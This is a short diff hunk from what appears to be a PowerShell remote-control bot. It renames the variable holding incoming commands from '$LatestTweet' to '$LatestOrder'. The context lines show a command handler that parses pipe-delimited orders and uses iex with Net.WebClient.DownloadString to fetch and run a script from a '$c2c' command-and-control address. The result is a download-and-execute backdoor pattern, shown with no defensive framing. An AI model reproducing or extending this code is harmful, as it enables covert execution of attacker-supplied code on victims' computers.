@@ -82,8 +82,8 @@ Function NewCommand { # !cmd|param1|param2 - blabla
 	[CmdletBinding()] param( 
 	[string]$id
 	)
-	[string] $param1 = $LatestTweet.split('|')[1]
-	[string] $param2 = $LatestTweet.split('|')[2]
+	[string] $param1 = $LatestOrder.split('|')[1]
+	[string] $param2 = $LatestOrder.split('|')[2]
 	iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/link/cmd.txt"))
 	cmd $param1 $param2
 	
